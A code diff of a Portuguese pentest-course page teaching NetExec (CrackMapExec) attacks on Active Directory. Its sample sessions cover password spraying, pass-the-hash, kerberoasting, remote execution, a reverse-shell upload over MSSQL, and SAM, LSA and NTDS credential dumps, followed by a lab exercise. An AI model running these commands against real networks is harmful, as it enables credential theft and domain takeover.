@@ -1,331 +1,486 @@
 import { PageContainer } from "@/components/layout/PageContainer";
-import { CodeBlock } from "@/components/ui/CodeBlock";
 import { AlertBox } from "@/components/ui/AlertBox";
+import { CodeBlock } from "@/components/ui/CodeBlock";
+import { CommandTable } from "@/components/ui/CommandTable";
+import { OutputBlock } from "@/components/ui/OutputBlock";
+import { PracticeBox } from "@/components/ui/PracticeBox";
+import { Terminal } from "@/components/ui/Terminal";
 
 export default function CrackMapExec() {
   return (
     <PageContainer
-      title="CrackMapExec / NetExec — Pós-Exploração em Active Directory"
-      subtitle="Domine CrackMapExec (CME/NetExec) para movimentação lateral em redes Windows. Inclui autenticação com hashes, spray de senhas, execução remota, dump de credenciais, e enumeração de Active Directory."
+      title="CrackMapExec / NetExec — canivete suíço de AD"
+      subtitle="Spray, enum, exec, dump em SMB/LDAP/WinRM/MSSQL/RDP. A ferramenta mais usada em pentest interno Windows."
       difficulty="avancado"
-      timeToRead="35 min"
+      timeToRead="20 min"
+      prompt="ad/cme"
     >
-      <h2>O que é CrackMapExec (NetExec)?</h2>
+      <h2>CME → NetExec (fork mantido)</h2>
       <p>
-        <strong>CrackMapExec</strong> (rebatizado como <strong>NetExec</strong>) é uma ferramenta de
-        pós-exploração para redes Windows/Active Directory. Ela permite testar credenciais em massa,
-        executar comandos remotamente, extrair hashes, e movimentar-se lateralmente na rede — tudo
-        via protocolos nativos do Windows (SMB, WinRM, LDAP, MSSQL, RDP, SSH).
+        O CrackMapExec original (mpgn) foi arquivado em 2023. O fork ativo é
+        <strong> NetExec (nxc)</strong> — mesmos comandos, melhorias, bugs corrigidos.
+        Use <code>nxc</code> em projeto novo, mas a sintaxe abaixo é 100% compatível.
       </p>
 
-      <AlertBox type="warning" title="Ferramenta de pós-exploração">
-        CME é usada DEPOIS de obter pelo menos uma credencial válida (usuário, hash, ou ticket Kerberos).
-        É a ferramenta principal para testar "até onde essa credencial leva?" na rede.
+      <h2>Setup</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo apt install -y netexec || pipx install netexec",
+            out: `Reading package lists... Done
+netexec is already the newest version (1.2.0).
+0 upgraded, 0 newly installed.`,
+            outType: "muted",
+          },
+          {
+            cmd: "nxc --version",
+            out: `nxc version 1.2.0
+[+] Loaded 5 modules from ~/.nxc/modules`,
+            outType: "info",
+          },
+          {
+            cmd: "nxc --help | head -20",
+            out: `usage: nxc [-h] [-v] [--version] {smb,ssh,winrm,ldap,mssql,wmi,rdp,nfs,ftp,vnc} ...
+
+Protocols:
+    smb        own stuff using SMB
+    ssh        own stuff using SSH
+    winrm      own stuff using WinRM
+    ldap       own stuff using LDAP
+    mssql      own stuff using MSSQL
+    wmi        own stuff using WMI
+    rdp        own stuff using RDP
+    nfs        own stuff using NFS
+    ftp        own stuff using FTP
+    vnc        own stuff using VNC`,
+            outType: "default",
+          },
+        ]}
+      />
+
+      <h2>Recon — descobrir DCs e máquinas Windows</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "scan SMB sem credencial — só fingerprint",
+            cmd: "nxc smb 192.168.50.0/24",
+            out: `SMB  192.168.50.10  445  DC01     [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:empresa.local) (signing:True)  (SMBv1:False)
+SMB  192.168.50.11  445  DC02     [*] Windows Server 2019 Standard 17763 x64 (name:DC02) (domain:empresa.local) (signing:True)  (SMBv1:False)
+SMB  192.168.50.20  445  WS-RH    [*] Windows 10.0 Build 19041 x64 (name:WS-RH) (domain:EMPRESA) (signing:False)  (SMBv1:False)
+SMB  192.168.50.21  445  WS-FIN   [*] Windows 10.0 Build 19041 x64 (name:WS-FIN) (domain:EMPRESA) (signing:False)  (SMBv1:False)
+SMB  192.168.50.30  445  FILE-01  [*] Windows Server 2016 Standard 14393 x64 (name:FILE-01) (domain:empresa.local) (signing:False)  (SMBv1:True)   ← SMBv1 = vuln
+SMB  192.168.50.40  445  PRT-LX   [*] Linux 6.5.0 (name:PRT-LX) (domain:WORKGROUP) (signing:False)`,
+            outType: "info",
+          },
+          {
+            comment: "extrair só os DCs",
+            cmd: "nxc smb 192.168.50.0/24 | grep -i 'Windows Server' | awk '{print $2}' > dcs.txt",
+            out: `(silencioso. dcs.txt:)
+192.168.50.10
+192.168.50.11
+192.168.50.30`,
+            outType: "default",
+          },
+          {
+            comment: "null session — testar acesso anônimo",
+            cmd: "nxc smb 192.168.50.10 -u '' -p '' --shares",
+            out: `SMB  192.168.50.10  445  DC01  [+] empresa.local\\: 
+SMB  192.168.50.10  445  DC01  [*] Enumerated shares
+SMB  192.168.50.10  445  DC01  Share           Permissions     Remark
+SMB  192.168.50.10  445  DC01  -----           -----------     ------
+SMB  192.168.50.10  445  DC01  IPC$            READ            Remote IPC
+SMB  192.168.50.10  445  DC01  NETLOGON                        Logon server share
+SMB  192.168.50.10  445  DC01  SYSVOL                          Logon server share`,
+            outType: "warning",
+          },
+        ]}
+      />
+
+      <h2>User enumeration (sem credencial)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "RID brute via null session",
+            cmd: "nxc smb 192.168.50.10 -u '' -p '' --rid-brute 4000",
+            out: `SMB  192.168.50.10  445  DC01  [*] Brute forcing RIDs
+SMB  192.168.50.10  445  DC01  500: EMPRESA\\Administrator (SidTypeUser)
+SMB  192.168.50.10  445  DC01  501: EMPRESA\\Guest (SidTypeUser)
+SMB  192.168.50.10  445  DC01  502: EMPRESA\\krbtgt (SidTypeUser)
+SMB  192.168.50.10  445  DC01  512: EMPRESA\\Domain Admins (SidTypeGroup)
+SMB  192.168.50.10  445  DC01  513: EMPRESA\\Domain Users (SidTypeGroup)
+SMB  192.168.50.10  445  DC01  1103: EMPRESA\\ana.silva (SidTypeUser)
+SMB  192.168.50.10  445  DC01  1104: EMPRESA\\joao.lopes (SidTypeUser)
+SMB  192.168.50.10  445  DC01  1105: EMPRESA\\svc-vpn (SidTypeUser)
+SMB  192.168.50.10  445  DC01  1106: EMPRESA\\svc-mssql (SidTypeUser)
+SMB  192.168.50.10  445  DC01  1107: EMPRESA\\svc-backup (SidTypeUser)`,
+            outType: "warning",
+          },
+          {
+            comment: "extrair só usernames para spray",
+            cmd: "nxc smb 192.168.50.10 -u '' -p '' --rid-brute 4000 | grep SidTypeUser | awk '{print $6}' | cut -d'\\' -f2 > users.txt",
+            out: `(users.txt: 87 nomes)
+Administrator
+Guest
+ana.silva
+joao.lopes
+svc-vpn
+[...]`,
+            outType: "info",
+          },
+          {
+            comment: "Kerbrute — mais rápido e menos ruidoso (não loga)",
+            cmd: "kerbrute userenum -d empresa.local --dc 192.168.50.10 users.txt",
+            out: `Version: dev (n/a)
+2026/04/03 23:42:11 >  Using KDC: 192.168.50.10:88
+
+2026/04/03 23:42:11 >  [+] VALID USERNAME:	ana.silva@empresa.local
+2026/04/03 23:42:11 >  [+] VALID USERNAME:	joao.lopes@empresa.local
+2026/04/03 23:42:11 >  [+] VALID USERNAME:	svc-vpn@empresa.local
+2026/04/03 23:42:11 >  Done! Tested 87 usernames (3 valid) in 0.421 seconds`,
+            outType: "success",
+          },
+        ]}
+      />
+
+      <h2>Password spray (1 senha × N users)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "tentar Empresa@2025 em TODOS users — espalha pela conta, não por senha",
+            cmd: "nxc smb 192.168.50.10 -u users.txt -p 'Empresa@2025!' --continue-on-success",
+            out: `SMB  192.168.50.10  445  DC01  [-] empresa.local\\Administrator:Empresa@2025! STATUS_LOGON_FAILURE
+SMB  192.168.50.10  445  DC01  [-] empresa.local\\Guest:Empresa@2025! STATUS_LOGON_FAILURE
+SMB  192.168.50.10  445  DC01  [+] empresa.local\\ana.silva:Empresa@2025!                     ← achou!
+SMB  192.168.50.10  445  DC01  [-] empresa.local\\joao.lopes:Empresa@2025! STATUS_LOGON_FAILURE
+SMB  192.168.50.10  445  DC01  [+] empresa.local\\svc-vpn:Empresa@2025! (Pwn3d!)             ← admin local!`,
+            outType: "warning",
+          },
+          {
+            comment: "spray com NTLM hash em vez de senha",
+            cmd: "nxc smb 192.168.50.0/24 -u ana.silva -H c1e07adc59f6c3eaa7a02e7a4e5f5cc1",
+            out: `SMB  192.168.50.10  445  DC01     [-] empresa.local\\ana.silva:c1e07adc... STATUS_NOT_SUPPORTED   ← signing required
+SMB  192.168.50.20  445  WS-RH    [+] empresa.local\\ana.silva:c1e07adc... (Pwn3d!)              ← admin!
+SMB  192.168.50.21  445  WS-FIN   [+] empresa.local\\ana.silva:c1e07adc... (Pwn3d!)              ← admin!
+SMB  192.168.50.30  445  FILE-01  [+] empresa.local\\ana.silva:c1e07adc...                       ← user
+SMB  192.168.50.40  445  PRT-LX   [+] empresa.local\\ana.silva:c1e07adc...`,
+            outType: "error",
+          },
+          {
+            comment: "ATENÇÃO: AD bloqueia conta após N falhas — sempre check policy primeiro",
+            cmd: "nxc smb 192.168.50.10 -u ana.silva -p 'qualquer' --pass-pol",
+            out: `SMB  192.168.50.10  445  DC01  [+] Dumping password info for domain: EMPRESA
+SMB  192.168.50.10  445  DC01  Minimum password length: 8
+SMB  192.168.50.10  445  DC01  Password history length: 24
+SMB  192.168.50.10  445  DC01  Maximum password age: 42 days
+SMB  192.168.50.10  445  DC01  Password Complexity Flags: 000001
+SMB  192.168.50.10  445  DC01    Domain Refuse Password Change: 0
+SMB  192.168.50.10  445  DC01    Domain Password Store Cleartext: 0
+SMB  192.168.50.10  445  DC01    Domain Password Lockout Admins: 0
+SMB  192.168.50.10  445  DC01    Domain Password No Clear Change: 0
+SMB  192.168.50.10  445  DC01    Domain Password No Anon Change: 0
+SMB  192.168.50.10  445  DC01    Domain Password Complex: 1
+SMB  192.168.50.10  445  DC01  Minimum password age: 0 days
+SMB  192.168.50.10  445  DC01  Reset Account Lockout Counter: 30 minutes
+SMB  192.168.50.10  445  DC01  Locked Account Duration: 30 minutes
+SMB  192.168.50.10  445  DC01  Account Lockout Threshold: 5             ← 5 erros = lock!
+SMB  192.168.50.10  445  DC01  Forced Log off Time: Not Set`,
+            outType: "info",
+          },
+        ]}
+      />
+
+      <h2>Pós-credenciais — Enumeração</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "shares com qualquer user válido",
+            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' --shares",
+            out: `SMB  192.168.50.30  445  FILE-01  [+] empresa.local\\ana.silva:Empresa@2025!
+SMB  192.168.50.30  445  FILE-01  [*] Enumerated shares
+SMB  192.168.50.30  445  FILE-01  Share           Permissions     Remark
+SMB  192.168.50.30  445  FILE-01  -----           -----------     ------
+SMB  192.168.50.30  445  FILE-01  ADMIN$                          Remote Admin
+SMB  192.168.50.30  445  FILE-01  C$                              Default share
+SMB  192.168.50.30  445  FILE-01  IPC$            READ            Remote IPC
+SMB  192.168.50.30  445  FILE-01  RH              READ,WRITE      Recursos Humanos
+SMB  192.168.50.30  445  FILE-01  Financeiro      READ            Documentos
+SMB  192.168.50.30  445  FILE-01  Public          READ,WRITE      Publica`,
+            outType: "warning",
+          },
+          {
+            comment: "spider — encontra arquivos interessantes",
+            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' -M spider_plus",
+            out: `SPIDER_PLUS    192.168.50.30  445  FILE-01  Started spidering
+SPIDER_PLUS    192.168.50.30  445  FILE-01  RH/folha-pagamentos.xlsx        842KB
+SPIDER_PLUS    192.168.50.30  445  FILE-01  RH/contratos/ana_silva.pdf      214KB
+SPIDER_PLUS    192.168.50.30  445  FILE-01  Financeiro/balanco-2025.xlsx    1.4MB
+SPIDER_PLUS    192.168.50.30  445  FILE-01  Public/passwords.txt            422B    ← !!
+SPIDER_PLUS    192.168.50.30  445  FILE-01  Public/wifi-corporativo.docx    18KB
+SPIDER_PLUS    192.168.50.30  445  FILE-01  output: /tmp/nxc_spider_output_192.168.50.30.json`,
+            outType: "error",
+          },
+          {
+            cmd: "nxc smb 192.168.50.30 -u ana.silva -p 'Empresa@2025!' --get-file 'Public/passwords.txt' 'pwd-leak.txt' --share Public",
+            out: `SMB  192.168.50.30  445  FILE-01  [+] File downloaded -> ./pwd-leak.txt`,
+            outType: "info",
+          },
+          {
+            cmd: "cat pwd-leak.txt",
+            out: `wifi corp: Empresa@WiFi2025
+admin do roteador: 192.168.0.1 admin/Empresa#42
+SQL prod: sa / SqlEmpresa2025!@
+joao - VPN: jlopes / Vpn2025!`,
+            outType: "error",
+          },
+        ]}
+      />
+
+      <h2>LDAP enum — usuários, grupos, GPOs</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --users",
+            out: `LDAP  192.168.50.10  389  DC01  [+] empresa.local\\ana.silva:Empresa@2025!
+LDAP  192.168.50.10  389  DC01  [*] Enumerated 142 users
+LDAP  192.168.50.10  389  DC01  -Username-                    -Last Logon-          -Description-
+LDAP  192.168.50.10  389  DC01  Administrator                 2026-04-03 14:21:42   Built-in account
+LDAP  192.168.50.10  389  DC01  Guest                         <never>               Built-in account
+LDAP  192.168.50.10  389  DC01  krbtgt                        <never>               Key Distribution
+LDAP  192.168.50.10  389  DC01  ana.silva                     2026-04-03 22:14:18   
+LDAP  192.168.50.10  389  DC01  svc-vpn                       2026-04-03 21:42:09   Service VPN — Welcome2025!@   ← desc com SENHA!
+LDAP  192.168.50.10  389  DC01  svc-mssql                     2026-04-03 18:32:01   SQL Service Account`,
+            outType: "warning",
+          },
+          {
+            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --kerberoasting kerb_hashes.txt",
+            out: `LDAP  192.168.50.10  389  DC01  [+] empresa.local\\ana.silva:Empresa@2025!
+LDAP  192.168.50.10  389  DC01  [*] Total of records returned 3
+LDAP  192.168.50.10  389  DC01  $krb5tgs$23$*svc-mssql$EMPRESA.LOCAL$MSSQLSvc/sql.empresa.local~1433*$abc...
+LDAP  192.168.50.10  389  DC01  $krb5tgs$23$*svc-web$EMPRESA.LOCAL$HTTP/web.empresa.local~80*$def...
+LDAP  192.168.50.10  389  DC01  [+] Hashes saved to kerb_hashes.txt`,
+            outType: "warning",
+          },
+          {
+            cmd: "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
+            out: `Recovered........: 1/3 (33.33%) Digests
+$krb5tgs$23$*svc-mssql$EMPRESA.LOCAL$MSSQLSvc/sql.empresa.local~1433*$abc...:SqlEmpresa2025!@`,
+            outType: "error",
+          },
+          {
+            comment: "AS-REP roasting — usuários sem pre-auth Kerberos",
+            cmd: "nxc ldap 192.168.50.10 -u ana.silva -p 'Empresa@2025!' --asreproast asrep.txt",
+            out: `LDAP  192.168.50.10  389  DC01  [*] Total of records returned 1
+LDAP  192.168.50.10  389  DC01  $krb5asrep$svc-old@EMPRESA.LOCAL:abc123def456...`,
+            outType: "warning",
+          },
+        ]}
+      />
+
+      <h2>Execução remota (com admin local)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' -x 'whoami; hostname; ipconfig'",
+            out: `SMB  192.168.50.20  445  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
+SMB  192.168.50.20  445  WS-RH  [+] Executed command via wmiexec
+SMB  192.168.50.20  445  WS-RH  empresa\\ana.silva
+SMB  192.168.50.20  445  WS-RH  WS-RH
+SMB  192.168.50.20  445  WS-RH  
+SMB  192.168.50.20  445  WS-RH  Windows IP Configuration
+SMB  192.168.50.20  445  WS-RH  
+SMB  192.168.50.20  445  WS-RH    IPv4 Address. . . . : 192.168.50.20
+SMB  192.168.50.20  445  WS-RH    Subnet Mask . . . . : 255.255.255.0`,
+            outType: "info",
+          },
+          {
+            cmd: "nxc winrm 192.168.50.20 -u ana.silva -p 'Empresa@2025!' -x 'powershell -c \"Get-Process | Select -First 5\"'",
+            out: `WINRM  192.168.50.20  5985  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
+WINRM  192.168.50.20  5985  WS-RH  [+] Executed command
+WINRM  192.168.50.20  5985  WS-RH  Handles  NPM(K)  PM(K)   WS(K)  CPU(s)  Id  ProcessName
+WINRM  192.168.50.20  5985  WS-RH    214      11    2236    8480    0.42   42  AggregatorHost
+WINRM  192.168.50.20  5985  WS-RH   1284      52   42412   62028    8.21  624  audiodg
+WINRM  192.168.50.20  5985  WS-RH    342      18    7836   16244    1.42  448  conhost
+WINRM  192.168.50.20  5985  WS-RH   1014      62  131884  142680   12.30 4421  explorer
+WINRM  192.168.50.20  5985  WS-RH    342      14    3624    8124    0.18  528  fontdrvhost`,
+            outType: "default",
+          },
+        ]}
+      />
+
+      <h2>Dump de credenciais — SAM, LSA, NTDS</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' --sam",
+            out: `SMB  192.168.50.20  445  WS-RH  [+] empresa.local\\ana.silva:Empresa@2025! (Pwn3d!)
+SMB  192.168.50.20  445  WS-RH  [+] Dumping SAM hashes
+SMB  192.168.50.20  445  WS-RH  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
+SMB  192.168.50.20  445  WS-RH  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB  192.168.50.20  445  WS-RH  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB  192.168.50.20  445  WS-RH  WS-RH$:1001:aad3b435b51404eeaad3b435b51404ee:8e2c3f4a5b6c7d8e9f0a1b2c3d4e5f60:::`,
+            outType: "warning",
+          },
+          {
+            cmd: "nxc smb 192.168.50.20 -u ana.silva -p 'Empresa@2025!' --lsa",
+            out: `SMB  192.168.50.20  445  WS-RH  [+] Dumping LSA secrets
+SMB  192.168.50.20  445  WS-RH  $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:8e2c3f4a5b6c7d8e9f0a1b2c3d4e5f60
+SMB  192.168.50.20  445  WS-RH  DefaultPassword: Empresa@2025!
+SMB  192.168.50.20  445  WS-RH  EMPRESA.LOCAL/svc-rdp: Empresa@RDP2024
+SMB  192.168.50.20  445  WS-RH  $MACHINE.ACC AES256: a1b2c3d4e5f6...`,
+            outType: "error",
+          },
+          {
+            cmd: "nxc smb 192.168.50.10 -u admin -p 'AdminDC@2025!' --ntds",
+            out: `SMB  192.168.50.10  445  DC01  [+] empresa.local\\admin:AdminDC@2025! (Pwn3d!)
+SMB  192.168.50.10  445  DC01  [+] Dumping the NTDS, this could take a while so go grab a coffee...
+SMB  192.168.50.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
+SMB  192.168.50.10  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8888888888888888aaaaaaaaaaaaaaaa:::   ← golden ticket!
+SMB  192.168.50.10  445  DC01  empresa.local\\ana.silva:1103:aad3b...:c1e07adc59f6c3eaa7a02e7a4e5f5cc1:::
+SMB  192.168.50.10  445  DC01  empresa.local\\joao.lopes:1104:aad3b...:88846f7eaee8fb117ad06bdd830b7586:::
+[...]
+SMB  192.168.50.10  445  DC01  [+] Dumped 142 NTDS hashes to ~/.nxc/logs/DC01.local_192.168.50.10_2026-04-03_233121.ntds`,
+            outType: "error",
+          },
+        ]}
+      />
+
+      <h2>Módulos prebuilt</h2>
+      <CommandTable
+        title="-M <modulo> (50+ disponíveis)"
+        variations={[
+          { cmd: "spider_plus", desc: "Lista todos arquivos em todas shares.", output: "Pega .docx, .xlsx, .ps1." },
+          { cmd: "lsassy", desc: "Dump de LSASS via comando remoto.", output: "Cleartext + Kerberos tickets." },
+          { cmd: "mimikatz", desc: "Sobe mimikatz e dumpa.", output: "AV-friendly via PE Sieve." },
+          { cmd: "wdigest", desc: "Habilita WDigest (cleartext em next logon).", output: "Persistência de captura." },
+          { cmd: "enum_chrome", desc: "Senhas salvas no Chrome do user logado.", output: "Cookies + cards + autofill." },
+          { cmd: "enum_dns", desc: "Lista zones DNS do AD.", output: "Pega todos os hostnames internos." },
+          { cmd: "gpp_password", desc: "Procura cpassword em SYSVOL (clássico).", output: "Cred legacy descriptografável." },
+          { cmd: "gpp_autologin", desc: "Auto-login GPO em SYSVOL.", output: "Workstation logando automático." },
+          { cmd: "rdp", desc: "Habilita RDP no alvo.", output: "Para conectar manualmente depois." },
+          { cmd: "uac", desc: "Configura UAC.", output: "Preparar para PsExec." },
+          { cmd: "petitpotam", desc: "Coage DC a autenticar (CVE-2021-36942).", output: "Para ntlmrelayx." },
+          { cmd: "printerbug", desc: "Coage via Print Spooler.", output: "MS-RPRN." },
+          { cmd: "shadowcoerce", desc: "Coage via FSRVP.", output: "Mais um vetor." },
+        ]}
+      />
+
+      <h2>MSSQL — também é destino</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' -q 'SELECT @@VERSION'",
+            out: `MSSQL  192.168.50.40  1433  SQL01  [+] empresa.local\\sa:SqlEmpresa2025!@ (Pwn3d!)
+MSSQL  192.168.50.40  1433  SQL01  [+] Executed query
+MSSQL  192.168.50.40  1433  SQL01  Microsoft SQL Server 2019 (RTM-CU18) (KB5017593) - 15.0.4261.1 (X64)
+MSSQL  192.168.50.40  1433  SQL01  Sep 14 2022 16:06:14
+MSSQL  192.168.50.40  1433  SQL01  Copyright (C) 2019 Microsoft Corporation`,
+            outType: "info",
+          },
+          {
+            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' -x 'whoami'",
+            out: `MSSQL  192.168.50.40  1433  SQL01  [+] Executed command via xp_cmdshell
+MSSQL  192.168.50.40  1433  SQL01  nt service\\mssqlserver`,
+            outType: "warning",
+          },
+          {
+            cmd: "nxc mssql 192.168.50.40 -u sa -p 'SqlEmpresa2025!@' --put-file revshell.exe 'C:\\Users\\Public\\x.exe'",
+            out: `MSSQL  192.168.50.40  1433  SQL01  [+] File uploaded successfully: C:\\Users\\Public\\x.exe`,
+            outType: "error",
+          },
+        ]}
+      />
+
+      <h2>Database de loot (~/.nxc)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "ls -la ~/.nxc/",
+            out: `drwxr-xr-x 6 wallyson wallyson  4096 Apr  3 23:42 .
+drwxr-xr-x 1 wallyson wallyson   228 Apr  3 23:42 ..
+-rw-r--r-- 1 wallyson wallyson 18421 Apr  3 23:42 nxc.conf
+drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 logs
+drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 modules
+drwxr-xr-x 2 wallyson wallyson  4096 Apr  3 23:42 screenshots
+drwxr-xr-x 5 wallyson wallyson  4096 Apr  3 23:42 workspaces`,
+            outType: "default",
+          },
+          {
+            comment: "TUDO captura é salvo no SQLite por workspace",
+            cmd: "nxc smb --workspace cliente_x",
+            out: `[*] Switched workspace to: cliente_x`,
+            outType: "muted",
+          },
+          {
+            cmd: "nxcdb workspace use cliente_x",
+            out: `nxcdb (cliente_x) > 
+(modo interativo: list creds, list hosts, ...)`,
+            outType: "info",
+          },
+          {
+            cmd: "(nxcdb) creds",
+            out: `+----+-------------+-------------+----------------------------------+----------+--------+
+| ID | Domain      | Username    | Password                         | Type     | Owned  |
++----+-------------+-------------+----------------------------------+----------+--------+
+| 1  | empresa.loc | ana.silva   | Empresa@2025!                    | plain    | True   |
+| 2  | empresa.loc | svc-vpn     | Welcome2025!@                    | plain    | True   |
+| 3  | empresa.loc | svc-mssql   | SqlEmpresa2025!@                 | plain    | True   |
+| 4  | empresa.loc | krbtgt      | 8888888888888888aaaaaaaaaaaaaaaa | hash     | True   |
++----+-------------+-------------+----------------------------------+----------+--------+`,
+            outType: "warning",
+          },
+        ]}
+      />
+
+      <PracticeBox
+        title="Lab: pwn AD com Vulnerable AD"
+        goal="Um lab AD reproduzível no docker, atacar com nxc do início ao fim."
+        steps={[
+          "Suba GOAD (Game Of Active Directory) — labs prontos.",
+          "Recon: nxc smb 192.168.10.0/24.",
+          "User enum via RID brute (null session).",
+          "Spray a senha 'Welcome01!' contra todos.",
+          "Ache o admin local; dumpe SAM.",
+          "Use o hash do Administrator local em pass-the-hash em todos os hosts.",
+          "Dumpe NTDS do DC.",
+        ]}
+        command={`# clonar GOAD
+git clone https://github.com/Orange-Cyberdefense/GOAD
+cd GOAD/ansible && ./goad.sh -p docker -i sevenkingdoms.local
+
+# atacar
+nxc smb 192.168.56.0/24
+nxc smb 192.168.56.10 -u '' -p '' --rid-brute 2000 | grep SidTypeUser
+nxc smb 192.168.56.10 -u users.txt -p 'Welcome01!' --continue-on-success
+
+# pegou? agora dump
+nxc smb 192.168.56.20 -u found_user -p 'Welcome01!' --sam --lsa
+nxc smb 192.168.56.10 -u admin -p 'AdminPass!' --ntds`}
+        expected={`SMB  192.168.56.20  445  CASTELBLACK  [+] sevenkingdoms\\stannis:Welcome01! (Pwn3d!)
+SMB  192.168.56.10  445  WINTERFELL    [+] Dumped 142 NTDS hashes`}
+        verify="Quando terminar: cd GOAD/ansible && ./goad.sh -p docker -t destroy"
+      />
+
+      <AlertBox type="warning" title="DPCAM (Domain Password Audit Mode)">
+        Para auditoria autorizada, use <code>nxc smb DC -u admin -p X --pwdLastSet --admin-count</code> +
+        <code> --ntds</code> + <strong>DPAT</strong> (offline tool) — gera relatório HTML completo
+        com top senhas, contas com senha que nunca expira, contas inativas, password reuse.
       </AlertBox>
 
-      <h2>Instalação e Sintaxe Básica</h2>
-      <CodeBlock
-        title="Instalar e entender a estrutura de comandos"
-        code={`# ═══════════════════════════════════════════════════
-# INSTALAR
-# ═══════════════════════════════════════════════════
-# No Kali (já pode estar instalado):
-sudo apt install crackmapexec
-# Ou a versão mais nova (NetExec):
-pip install netexec
-
-# ═══════════════════════════════════════════════════
-# ESTRUTURA DO COMANDO
-# ═══════════════════════════════════════════════════
-# crackmapexec PROTOCOLO ALVO [AUTENTICAÇÃO] [AÇÃO]
-#
-# PROTOCOLO: smb, winrm, ldap, mssql, rdp, ssh
-# ALVO: IP, range CIDR, lista de IPs
-# AUTENTICAÇÃO: -u user -p senha (ou -H hash)
-# AÇÃO: --shares, --sam, --lsa, -x comando, etc.
-
-# Exemplos de alvo:
-crackmapexec smb 192.168.1.100           # IP único
-crackmapexec smb 192.168.1.0/24          # Range CIDR
-crackmapexec smb 192.168.1.100-200       # Range de IPs
-crackmapexec smb targets.txt             # Arquivo com IPs
-
-# ═══════════════════════════════════════════════════
-# PROTOCOLOS E PORTAS
-# ═══════════════════════════════════════════════════
-# smb   — porta 445 (compartilhamentos, SAM, LSA)
-# winrm — porta 5985/5986 (PowerShell remoto)
-# ldap  — porta 389/636 (Active Directory queries)
-# mssql — porta 1433 (SQL Server)
-# rdp   — porta 3389 (Remote Desktop)
-# ssh   — porta 22 (Linux/switches)`}
-      />
-
-      <h2>Autenticação — Todas as Formas</h2>
-      <CodeBlock
-        title="Autenticar com senha, hash NTLM, e Kerberos"
-        code={`# ═══════════════════════════════════════════════════
-# AUTENTICAÇÃO COM SENHA
-# ═══════════════════════════════════════════════════
-crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!'
-# Output:
-# SMB  192.168.1.100  445  DC01  [*] Windows Server 2019 (domain:EMPRESA)
-# SMB  192.168.1.100  445  DC01  [+] EMPRESA\\admin:P@ssw0rd! (Pwn3d!)
-#                                                             ^^^^^^^^
-# "(Pwn3d!)" significa que o usuário tem ADMIN LOCAL no host!
-# Se não aparecer → autenticação válida mas sem admin local.
-
-# ═══════════════════════════════════════════════════
-# AUTENTICAÇÃO COM HASH NTLM (Pass-the-Hash)
-# ═══════════════════════════════════════════════════
-# Se você tem o hash NTLM (obtido via Mimikatz, SAM dump, etc.):
-crackmapexec smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
-# -H = hash no formato LM:NT
-# O hash LM geralmente é aad3b435... (vazio)
-# O hash NT é o que importa
-
-# Também aceita apenas o hash NT:
-crackmapexec smb 192.168.1.100 -u admin -H '32ed87bdb5fdc5e9cba88547376818d4'
-
-# ═══════════════════════════════════════════════════
-# AUTENTICAÇÃO KERBEROS
-# ═══════════════════════════════════════════════════
-# Se tem ticket Kerberos (.ccache):
-export KRB5CCNAME=/tmp/admin.ccache
-crackmapexec smb dc01.empresa.local -k --use-kcache
-# -k = usar Kerberos
-# --use-kcache = usar ticket do KRB5CCNAME
-# Não precisa de senha ou hash!
-
-# ═══════════════════════════════════════════════════
-# TESTAR CREDENCIAIS EM VÁRIOS HOSTS
-# ═══════════════════════════════════════════════════
-# Mesma credencial em toda a rede:
-crackmapexec smb 192.168.1.0/24 -u admin -p 'P@ssw0rd!'
-# Resultado para cada host:
-# [+] = credencial válida
-# [-] = credencial inválida
-# (Pwn3d!) = admin local no host
-
-# ═══════════════════════════════════════════════════
-# INTERPRETANDO OS RESULTADOS
-# ═══════════════════════════════════════════════════
-# [+] EMPRESA\\admin:P@ssw0rd! → login válido, sem admin
-# [+] EMPRESA\\admin:P@ssw0rd! (Pwn3d!) → ADMIN LOCAL!
-# [-] EMPRESA\\admin:P@ssw0rd! STATUS_LOGON_FAILURE → senha errada
-# [-] EMPRESA\\admin:P@ssw0rd! STATUS_ACCOUNT_LOCKED_OUT → conta bloqueada!
